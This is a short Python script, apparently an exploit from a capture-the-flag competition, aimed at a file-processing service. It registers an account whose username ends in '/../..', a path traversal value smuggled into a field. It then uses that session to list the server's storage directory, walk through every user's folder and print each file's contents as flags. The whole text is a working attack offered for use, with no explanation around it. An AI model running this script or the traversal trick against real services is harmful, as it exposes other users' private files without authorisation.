import json
import sys

from api import register, process_file, gen_string


def main():
    hostname = "localhost" if len(sys.argv) < 2 else sys.argv[1]
    session = register(hostname, gen_string() + "/../..", gen_string())
    users = json.loads(process_file(session, hostname, "storage/"))
    for user in users:
        user_files = json.loads(process_file(session, hostname, f"storage/{user}"))
        for user_file in user_files:
            flag = process_file(session, hostname, f"storage/{user}/{user_file}")
            print(flag)


if __name__ == '__main__':
    main()
